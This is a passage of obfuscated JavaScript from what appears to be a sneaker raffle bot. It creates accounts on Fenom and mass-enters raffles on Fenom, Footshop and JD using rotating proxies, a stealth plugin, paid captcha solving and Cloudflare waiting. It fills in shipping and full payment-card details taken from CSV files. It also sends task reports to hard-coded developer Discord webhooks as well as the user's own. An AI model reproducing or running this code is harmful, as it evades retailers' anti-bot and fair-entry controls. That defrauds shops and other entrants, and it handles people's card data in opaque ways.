                                await _0x21f2f4['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), _0x1032b5 = 'no', console['log'](_0x5bbbd3['green'](_0xd645bd() + '\x20[' + _0x47eac2['name'] + ']\x20Task\x20' + (_0x5df39c + 0x1) + '\x20:\x20Account\x20' + _0x124082[_0x5df39c]['Email'] + '\x20Generated')), _0x396fe9['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x124082[_0x5df39c]['Email'] + ',' + _0x124082[_0x5df39c]['Password']);
                                try {
                                    _0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '' && await _0x2860ef(_0x474e1d['webhook'], _0x1449e0['succesDEVMSG']);
                                } catch {
                                }
                                await _0x2860ef(_0x29555e, _0x1449e0['succesDEVMSG']);
                            } catch (_0x23b4eb) {
                                throw new Error('Account\x20generation\x20failed:\x20' + _0x23b4eb);
                            }
                        } catch (_0x42f3aa) {
                            console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x47eac2['name'] + ']\x20Task\x20' + (_0x5df39c + 0x1) + '\x20:\x20' + _0x42f3aa)), _0x184768 = '' + _0x42f3aa;
                            var _0x23d889 = await _0x476a56(_0x124082[_0x5df39c], _0x47eac2, 'acc', !![], _0x184768);
                            _0x1449e0['errorDEV'] = { 'embeds': [_0x23d889] }, _0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '' && await _0x2860ef(_0x474e1d['webhook'], _0x1449e0['errorDEV']), await _0x2860ef(_0x406b45, _0x1449e0['errorDEV']), _0x1032b5 = 'yes';
                        } finally {
                            _0x2a9d84['close']();
                            if (_0x1032b5 == 'yes' && _0x539237 != 0x5 && _0x184768 != 'Size\x20Not\x20Found') {
                                console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x47eac2['name'] + ']\x20Task\x20' + (_0x5df39c + 0x1) + '\x20:\x20Retrying')), _0x5df39c = _0x5df39c - 0x1, _0x539237 = _0x539237 + 0x1;
                                continue;
                            }
                            _0x1032b5 == 'yes' && _0x539237 >= 0x5 && (_0x78fa55(_0x124082[_0x5df39c], _0x47eac2), _0x1032b5 = 'no', _0x539237 = 0x0), console['log'](_0xd645bd() + '\x20[' + _0x47eac2['name'] + ']\x20Waiting\x20for\x20' + _0x474e1d['delay'] + '\x20ms'), await _0x90116b(_0x474e1d['delay']);
                        }
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x14ee49(_0x3fd09d, _0x1a23a5, _0x14e504) {
                    _0x51bd0a['use'](_0x5a6562()), _0x51bd0a['use'](_0x2f2194({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x474e1d['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x46594 = 0x0; _0x46594 < _0x1a23a5['length']; _0x46594++) {
                        if (_0x1f7e9b != 'yes')
                            var _0x1f7e9b = '', _0x1bfd6e = 0x0;
                        var _0x3147a0;
                        await _0x526adb(_0x1a23a5, _0x46594), _0x4e8779(_0x3fd09d['name'] + '\x20Task\x20' + (_0x46594 + 0x1) + '\x20/\x20' + _0x1a23a5['length'] + '\x20||\x20File:\x20' + _0x10c107 + '\x20Proxies:\x20' + _0x68d2dc);
                        const _0x94ea9b = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x32edd9 = Math['round'](Math['random']() * (_0x14e504['length'] - 0x1)), _0x4d14fb = _0x14e504[_0x32edd9]['split'](':'), _0x3ce1db;
                        try {
                            _0x3ce1db = await _0x51bd0a['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4d14fb[0x0] + ':' + _0x4d14fb[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3ce1db = await _0x51bd0a['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4d14fb[0x0] + ':' + _0x4d14fb[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xd6c30c = await _0x3ce1db['newPage'](), _0xd25442 = await _0xd6c30c['target']()['createCDPSession'](), { windowId: _0x162a3d } = await _0xd25442['send']('Browser.getWindowForTarget');
                            await _0xd6c30c['authenticate']({
                                'username': '' + _0x4d14fb[0x2],
                                'password': '' + _0x4d14fb[0x3]
                            }), console['log'](_0xd645bd() + '\x20[' + _0x3fd09d['name'] + ']\x20Task\x20' + (_0x46594 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xd6c30c['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0xd645bd() + '\x20[' + _0x3fd09d['name'] + ']\x20Task\x20' + (_0x46594 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x90116b(0xbb8), await _0xd25442['send']('Browser.setWindowBounds', {
                                'windowId': _0x162a3d,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x90116b(0x1f40);
                            try {
                                await _0xd6c30c['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x90116b(0x1388), console['log'](_0xd645bd() + '\x20[' + _0x3fd09d['name'] + ']\x20Task\x20' + (_0x46594 + 0x1) + '\x20:\x20Logging\x20in'), await _0xd6c30c['type']('input[name=\x22email\x22]', '' + _0x1a23a5[_0x46594]['Email']), await _0x90116b(0x1f4), await _0xd6c30c['type']('input[name=\x22password\x22]', '' + _0x1a23a5[_0x46594]['Password']), await _0x90116b(0x258), await _0xd6c30c['$eval']('#login-form', _0x13707d => _0x13707d['submit']()), await _0xd6c30c['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x90116b(0x1f4), await _0xd6c30c['goto']('' + _0x1a23a5[_0x46594]['Url']), await _0xd6c30c['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0xd645bd() + '\x20[' + _0x3fd09d['name'] + ']\x20Task\x20' + (_0x46594 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x1a23a5[_0x46594]['Size']);
                            if (_0x1a23a5[_0x46594]['Size'] != 'RANDOM') {
                                var _0x3b7a9f = '\x20' + _0x1a23a5[_0x46594]['Size'] + '\x20';
                                const _0x45db85 = await _0xd6c30c['$x']('//span[contains(text(),\x20' + _0x3b7a9f + ')]');
                                await _0x45db85[0x0]['click']();
                            } else {
                                const _0x1642dc = await _0xd6c30c['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x432870 = Math['round'](Math['random']() * (_0x1642dc['length'] - 0x1));
                                await _0x1642dc[_0x432870]['click']();
                            }
                            await _0x90116b(0x258), await _0xd6c30c['click']('#cookieChoiceDismiss'), await _0x90116b(0x3e8), await _0xd6c30c['type']('#instagram-account', '' + _0x1a23a5[_0x46594]['Follower']), await _0x90116b(0x28a), await _0xd6c30c['click']('#book-btn'), await _0x90116b(0xbb8), await _0xd6c30c['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe'), await _0x90116b(0x1f4), console['log'](_0xd645bd() + '\x20[' + _0x3fd09d['name'] + ']\x20Task\x20' + (_0x46594 + 0x1) + '\x20:\x20' + _0x5bbbd3['cyan']('Solving\x20Captcha')), await _0xd6c30c['solveRecaptchas'](), console['log'](_0xd645bd() + '\x20[' + _0x3fd09d['name'] + ']\x20Task\x20' + (_0x46594 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x90116b(0x7d0), await _0xd6c30c['$eval']('#book-btn-for-sure', _0x2d8f3f => _0x2d8f3f['click']()), await _0x90116b(0x12c), await _0xd6c30c['click']('#book-btn-for-sure'), await _0x90116b(0xdac);
                            const _0x3c838c = await _0xd6c30c['$eval']('.reservation-popup\x20>\x20.title', _0x22cea1 => {
                                return _0x22cea1['innerHTML'];
                            });
                            if (_0x3c838c) {
                                _0x1f7e9b = 'no', _0x2812a5(_0x1a23a5[_0x46594], _0x3fd09d), console['log'](_0x5bbbd3['green'](_0xd645bd() + '\x20[' + _0x3fd09d['name'] + ']\x20Task\x20' + (_0x46594 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x49db33 = await _0x476a56(_0x1a23a5[_0x46594], _0x3fd09d, 'dev', ![]), _0x430e7c = await _0x476a56(_0x1a23a5[_0x46594], _0x3fd09d, 'pub', ![]);
                                const _0x1607b6 = {
                                    'succesDEVMSG': { 'embeds': [_0x49db33] },
                                    'succesPUBMSG': { 'embeds': [_0x430e7c] }
                                };
                                try {
                                    _0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '' && await _0x2860ef(_0x474e1d['webhook'], _0x1607b6['succesDEVMSG']), await _0x90116b(0xc8), await _0x2860ef(_0x5e16d4, _0x1607b6['succesDEVMSG']), await _0x90116b(0xc8), await _0x2860ef(_0x3c50b7, _0x1607b6['succesPUBMSG']);
                                } catch (_0xc3d9a3) {
                                    console['log'](_0x5bbbd3['yellow'](_0xd645bd() + '\x20[' + _0x3fd09d['name'] + ']\x20Task\x20' + (_0x46594 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xc3d9a3));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x3253c5) {
                            console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x3fd09d['name'] + ']\x20Task\x20' + (_0x46594 + 0x1) + '\x20:\x20' + _0x3253c5)), _0x3147a0 = '' + _0x3253c5;
                            var _0x15952e = await _0x476a56(_0x1a23a5[_0x46594], _0x3fd09d, 'dev', !![], _0x3147a0), _0x49db33 = await _0x476a56(_0x1a23a5[_0x46594], _0x3fd09d, 'dev', ![]), _0x430e7c = await _0x476a56(_0x1a23a5[_0x46594], _0x3fd09d, 'pub', ![]);
                            const _0x139e81 = {
                                'succesDEVMSG': { 'embeds': [_0x49db33] },
                                'succesPUBMSG': { 'embeds': [_0x430e7c] }
                            };
                            _0x139e81['errorDEV'] = { 'embeds': [_0x15952e] }, _0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '' && await _0x2860ef(_0x474e1d['webhook'], _0x139e81['errorDEV']), await _0x2860ef(_0x406b45, _0x139e81['errorDEV']), _0x3253c5 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x1f7e9b = 'yes');
                        } finally {
                            _0x3ce1db['close']();
                            if (_0x1f7e9b == 'yes' && _0x1bfd6e != 0x5 && _0x3147a0 != 'Size\x20Not\x20Found') {
                                console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x3fd09d['name'] + ']\x20Task\x20' + (_0x46594 + 0x1) + '\x20:\x20Retrying')), _0x46594 = _0x46594 - 0x1, _0x1bfd6e = _0x1bfd6e + 0x1;
                                continue;
                            }
                            _0x1f7e9b == 'yes' && _0x1bfd6e >= 0x5 && (_0x78fa55(_0x1a23a5[_0x46594], _0x3fd09d), _0x1f7e9b = 'no', _0x1bfd6e = 0x0), console['log'](_0xd645bd() + '\x20[' + _0x3fd09d['name'] + ']\x20Waiting\x20for\x20' + _0x474e1d['delay'] + '\x20ms'), await _0x90116b(_0x474e1d['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x23ea2d, _0x4f2a8b, _0x5288cc) {
                _0x51bd0a['use'](_0x5a6562()), _0x51bd0a['use'](_0x2f2194({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x474e1d['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x211413 = 0x0; _0x211413 < _0x4f2a8b['length']; _0x211413++) {
                    var _0x24abb6;
                    if (_0x3b0775 != 'yes')
                        var _0x3b0775 = '', _0x27e224 = 0x0;
                    var _0x4eb168 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x54e6a5
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x4f2a8b[_0x211413]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x4f2a8b[_0x211413]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x474e1d['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x1144ef
                            }
                        ]
                    }], _0x3c41cf = await _0x476a56(_0x4f2a8b[_0x211413], _0x23ea2d, 'dev', ![]), _0x269c74 = await _0x476a56(_0x4f2a8b[_0x211413], _0x23ea2d, 'pub', ![]);
                    const _0x502d78 = {
                        'succesDEVMSG': { 'embeds': [_0x3c41cf] },
                        'succesPUBMSG': { 'embeds': [_0x269c74] }
                    }, _0x4f92bb = { 'embeds': _0x4eb168 };
                    await _0x526adb(_0x4f2a8b, _0x211413);
                    if (_0x4f2a8b[_0x211413]['Email'] == '' || _0x4f2a8b[_0x211413]['FirstName'] == '' || _0x4f2a8b[_0x211413]['LastName'] == '' || _0x4f2a8b[_0x211413]['Country'] == '' || _0x4f2a8b[_0x211413]['Size'] == '' || _0x4f2a8b[_0x211413]['Address1'] == '' || _0x4f2a8b[_0x211413]['Zip'] == '') {
                        console['log'](_0xd645bd() + '\x20[' + _0x23ea2d['name'] + ']\x20Task\x20' + (_0x211413 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x4f2a8b[_0x211413]['Email'] == '' || _0x4f2a8b[_0x211413]['FirstName'] == '' || _0x4f2a8b[_0x211413]['LastName'] == '' || _0x4f2a8b[_0x211413]['Country'] == '' || _0x4f2a8b[_0x211413]['Size'] == '' || _0x4f2a8b[_0x211413]['Address1'] == '' || _0x4f2a8b[_0x211413]['Zip'] == '' || _0x4f2a8b[_0x211413]['Phone'] == '') {
                        console['log'](_0xd645bd() + '\x20[' + _0x23ea2d['name'] + ']\x20Task\x20' + (_0x211413 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x23cd31 = '' + _0x4f2a8b[_0x211413]['Url'];
                    if (_0x474e1d['useRandomProxy'] = ![])
                        var _0x3670ff = _0x5288cc[_0x211413]['split'](':');
                    else
                        var _0x234aa1 = Math['round'](Math['random']() * (_0x5288cc['length'] - 0x1)), _0x3670ff = _0x5288cc[_0x234aa1]['split'](':');
                    const _0x1c9f9e = await _0x51bd0a['launch']({
                        'headless': !![],
                        'args': ['--proxy-server=' + _0x3670ff[0x0] + ':' + _0x3670ff[0x1]]
                    });
                    try {
                        const _0xc82cd2 = await _0x1c9f9e['newPage']();
                        await _0xc82cd2['authenticate']({
                            'username': '' + _0x3670ff[0x2],
                            'password': '' + _0x3670ff[0x3]
                        }), console['log'](_0xd645bd() + '\x20[' + _0x23ea2d['name'] + ']\x20Task\x20' + (_0x211413 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xc82cd2['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0xc82cd2['setRequestInterception'](!![]), _0xc82cd2['on']('request', _0x58576e => {
                            _0x58576e['resourceType']() === 'image' || _0x58576e['resourceType']() === 'font' || _0x58576e['resourceType']() === 'media' ? _0x58576e['abort']() : _0x58576e['continue']();
                        }), await _0xc82cd2['goto'](_0x23cd31), await _0x90116b(0xbb8), await _0xc82cd2['waitForSelector']('.control__JhutY'), await _0xc82cd2['click']('.control__JhutY'), await _0x90116b(0x1f4);
                        if (_0x4f2a8b[_0x211413]['Size'] != 'RANDOM')
                            try {
                                const _0x25baec = await _0xc82cd2['$x']('//div[contains(text(),\x20\x27' + _0x4f2a8b[_0x211413]['Size'] + '\x27)]');
                                await _0x25baec[0x0]['click']();
                            } catch {
                                console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x23ea2d['name'] + ']\x20Task\x20' + (_0x211413 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x49bb5a = await _0xc82cd2['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x4e702f = Math['round'](Math['random']() * (_0x49bb5a['length'] - 0x1));
                            await _0x49bb5a[_0x4e702f]['click']();
                        }
                        await _0x90116b(0x4b0);
                        const _0x3480b9 = await _0xc82cd2['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x3480b9[0x0]['click'](), await _0xc82cd2['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0xd645bd() + '\x20[' + _0x23ea2d['name'] + ']\x20Task\x20' + (_0x211413 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0xc82cd2['type']('input[name=\x22email\x22]', '' + _0x4f2a8b[_0x211413]['Email']), await _0x90116b(0x640), await _0xc82cd2['type']('input[name=\x22phone\x22]', '' + _0x4f2a8b[_0x211413]['Phone']), await _0x90116b(0x4b0), await _0xc82cd2['click']('button.btn.continue-button__1RtsS'), await _0x90116b(0x4b0);
                        try {
                            await _0xc82cd2['type']('input[name=\x22firstName\x22]', '' + _0x4f2a8b[_0x211413]['FirstName']), await _0x90116b(0x258);
                        } catch {
                            const _0x17c2f6 = await _0xc82cd2['$$eval']('.invalid-feedback\x20>\x20div', _0x3e14e4 => {
                                return _0x3e14e4['map'](_0x51f99a => _0x51f99a['innerText']);
                            });
                            console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x23ea2d['name'] + ']\x20Task\x20' + (_0x211413 + 0x1) + '\x20:\x20' + _0x17c2f6));
                            continue;
                        }
                        await _0xc82cd2['type']('input[name=\x22lastName\x22]', '' + _0x4f2a8b[_0x211413]['LastName']), await _0x90116b(0xc8), await _0xc82cd2['type']('input[name=\x22instagramUsername\x22]', '' + _0x4f2a8b[_0x211413]['Follower']), await _0x90116b(0x4b0), await _0xc82cd2['click']('button.btn.continue-button__1RtsS'), await _0x90116b(0x3e8), console['log'](_0xd645bd() + '\x20[' + _0x23ea2d['name'] + ']\x20Task\x20' + (_0x211413 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0xc82cd2['select']('select[name=\x22country\x22]', '' + _0x4f2a8b[_0x211413]['Country']), await _0x90116b(0x2bc), await _0xc82cd2['type']('input[name=\x22streetName\x22]', '' + _0x4f2a8b[_0x211413]['Address1']), await _0x90116b(0x258), await _0xc82cd2['type']('input[name=\x22houseNumber\x22]', _0x4f2a8b[_0x211413]['HouseNumber'] + '\x20' + _0x4f2a8b[_0x211413]['Address2']), await _0x90116b(0xc8), await _0xc82cd2['type']('input[name=\x22postalCode\x22]', '' + _0x4f2a8b[_0x211413]['Zip']), await _0x90116b(0x1f4), await _0xc82cd2['type']('input[name=\x22city\x22]', '' + _0x4f2a8b[_0x211413]['City']), await _0x90116b(0x4b0), await _0xc82cd2['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x90116b(0x4b0), await _0xc82cd2['click']('button.btn.continue-button__1RtsS'), await _0x90116b(0x4b0), console['log'](_0xd645bd() + '\x20[' + _0x23ea2d['name'] + ']\x20Task\x20' + (_0x211413 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0xc82cd2['solveRecaptchas'](), console['log'](_0xd645bd() + '\x20[' + _0x23ea2d['name'] + ']\x20Task\x20' + (_0x211413 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x90116b(0xbb8), await _0xc82cd2['click']('button.btn.continue-button__1RtsS'), await _0x90116b(0x1388), console['log'](_0xd645bd() + '\x20[' + _0x23ea2d['name'] + ']\x20Task\x20' + (_0x211413 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0xc82cd2['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xc82cd2['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x90116b(0x4b0), await _0xc82cd2['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x4f2a8b[_0x211413]['CardNumber']), await _0x90116b(0x320), await _0xc82cd2['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0xc82cd2['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x4f2a8b[_0x211413]['ExpiryDate']), await _0x90116b(0x4b0), await _0xc82cd2['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0xc82cd2['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x4f2a8b[_0x211413]['CVV']), await _0x90116b(0x226), await _0xc82cd2['type']('input[name=\x22holderName\x22]', '' + _0x4f2a8b[_0x211413]['NameOnCard']), await _0x90116b(0x226), await _0xc82cd2['click']('button.adyen-checkout__button'), console['log'](_0xd645bd() + '\x20[' + _0x23ea2d['name'] + ']\x20Task\x20' + (_0x211413 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0xc82cd2['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x90116b(0xbb8);
                        } catch (_0x1369bb) {
                            console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x23ea2d['name'] + ']\x20Task\x20' + (_0x211413 + 0x1) + '\x20:\x203DS\x20Failed')), _0x24abb6 = '3DS\x20Error\x20' + _0x1369bb;
                            var _0x59ad62 = await _0x476a56(_0x4f2a8b[_0x211413], _0x23ea2d, 'dev', !![], _0x24abb6);
                            _0x502d78['errorDEV'] = { 'embeds': [_0x59ad62] };
                            _0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '' && await _0x2860ef(_0x474e1d['webhook'], _0x502d78['errorDEV']);
                            await _0x2860ef(_0x406b45, _0x502d78['errorDEV']);
                            continue;
                        }
                        _0x2812a5(_0x4f2a8b[_0x211413], _0x23ea2d), console['log'](_0x5bbbd3['green'](_0xd645bd() + '\x20[' + _0x23ea2d['name'] + ']\x20Task\x20' + (_0x211413 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        if (_0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '')
                            try {
                                await _0x2860ef(_0x474e1d['webhook'], _0x502d78['succesDEVMSG']);
                            } catch {
                            }
                        await _0x90116b(0xc8), await _0x2860ef(_0x5e16d4, _0x502d78['succesDEVMSG']), await _0x90116b(0xc8);
                        try {
                            await _0x2860ef(_0x3c50b7, _0x502d78['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x5db953) {
                        console['log'](_0xd645bd() + '\x20[' + _0x23ea2d['name'] + ']\x20Task\x20' + (_0x211413 + 0x1) + '\x20:\x20' + _0x5db953), _0x24abb6 = '' + _0x5db953;
                        var _0x59ad62 = await _0x476a56(_0x4f2a8b[_0x211413], _0x23ea2d, 'dev', !![], _0x24abb6);
                        _0x502d78['errorDEV'] = { 'embeds': [_0x59ad62] }, _0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '' && await _0x2860ef(_0x474e1d['webhook'], _0x502d78['errorDEV']), await _0x2860ef(_0x406b45, _0x502d78['errorDEV']), _0x3b0775 = 'yes';
                    } finally {
                        _0x1c9f9e['close']();
                        if (_0x3b0775 == 'yes' && _0x27e224 != 0x5) {
                            console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x23ea2d['name'] + ']\x20Task\x20' + (_0x211413 + 0x1) + '\x20:\x20Retrying')), _0x211413 = _0x211413 - 0x1, _0x27e224 = _0x27e224 + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x474e1d['footshopDelay'] + '\x20ms'), await _0x90116b(_0x474e1d['footshopDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x29c4ae, _0x1b89c0, _0x4bf3f4) {
                var _0xac2004 = ![], _0x3a6d77 = ![];
                if (_0x474e1d['captchaKey'] == '' || _0x474e1d['captchaKey'] == undefined)
                    return console['log'](_0x5bbbd3['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x51bd0a['use'](_0x5a6562()), _0x51bd0a['use'](_0x2f2194({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x474e1d['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x35323d = 0x0; _0x35323d < _0x1b89c0['length']; _0x35323d++) {
                    if (_0x1e6f87 != 'yes')
                        var _0x1e6f87 = '', _0xb18d1e = 0x0;
                    var _0x75ead7, _0x28be02 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x1b89c0[_0x35323d]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x1b89c0[_0x35323d]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x54e6a5
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x474e1d['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x1144ef
                            }
                        ]
                    }];
                    const _0x4d725f = { 'embeds': _0x28be02 };
                    _0x4e8779(_0x29c4ae['name'] + '\x20Task\x20' + (_0x35323d + 0x1) + '\x20/\x20' + _0x1b89c0['length'] + '\x20||\x20File:\x20' + _0x10c107 + '\x20Proxies:\x20' + _0x68d2dc), await _0x526adb(_0x1b89c0, _0x35323d);
                    var _0xf107a0 = await _0x476a56(_0x1b89c0[_0x35323d], _0x29c4ae, 'dev', ![]), _0x4b9b91 = await _0x476a56(_0x1b89c0[_0x35323d], _0x29c4ae, 'pub', ![]);
                    const _0x36e122 = {
                        'succesDEVMSG': { 'embeds': [_0xf107a0] },
                        'succesPUBMSG': { 'embeds': [_0x4b9b91] }
                    };
                    if (_0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '')
                        try {
                            await _0x2860ef(_0x474e1d['webhook'], _0x36e122['succesDEVMSG']);
                        } catch {
                        }
                    await _0x90116b(0xc8), await _0x2860ef(_0x5e16d4, _0x36e122['succesDEVMSG']), await _0x90116b(0xc8);
                    try {
                        await _0x2860ef(_0x3c50b7, _0x36e122['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x1b89c0[_0x35323d]['Email'] == '' || _0x1b89c0[_0x35323d]['Url'] == '' || _0x1b89c0[_0x35323d]['FirstName'] == '' || _0x1b89c0[_0x35323d]['LastName'] == '') {
                        console['log'](_0xd645bd() + '\x20[' + _0x211f0b[taskModule]['name'] + ']\x20Task\x20' + (_0x35323d + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x474e1d['useRandomProxy'] = ![])
                        var _0x3f9b79 = _0x4bf3f4[_0x35323d]['split'](':');
                    else
                        var _0x2a01b2 = Math['round'](Math['random']() * (_0x4bf3f4['length'] - 0x1)), _0x3f9b79 = _0x4bf3f4[_0x2a01b2]['split'](':');
                    const _0x49f4ff = await _0x51bd0a['launch']({
                        'headless': ![],
                        'args': [
                            '--proxy-server=' + _0x3f9b79[0x0] + ':' + _0x3f9b79[0x1],
                            '--no-sandbox',
                            '--disable-setuid-sandbox'
                        ]
                    });
                    try {
                        const _0x219b99 = await _0x49f4ff['newPage']();
                        await _0x219b99['authenticate']({
                            'username': '' + _0x3f9b79[0x2],
                            'password': '' + _0x3f9b79[0x3]
                        }), console['log'](_0xd645bd() + '\x20[' + _0x29c4ae['name'] + ']\x20Task\x20' + (_0x35323d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x219b99['setRequestInterception'](!![]), _0x219b99['on']('request', _0x329b55 => {
                            _0x329b55['resourceType']() === 'image' || _0x329b55['resourceType']() === 'font' || _0x329b55['resourceType']() === 'media' ? _0x329b55['abort']() : _0x329b55['continue']();
                        }), await _0x219b99['goto']('' + _0x1b89c0[_0x35323d]['Url'], {
                            'waitUntil': 'networkidle2',
                            'timeout': 0xea60
                        });
                        try {
                            await _0x219b99['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
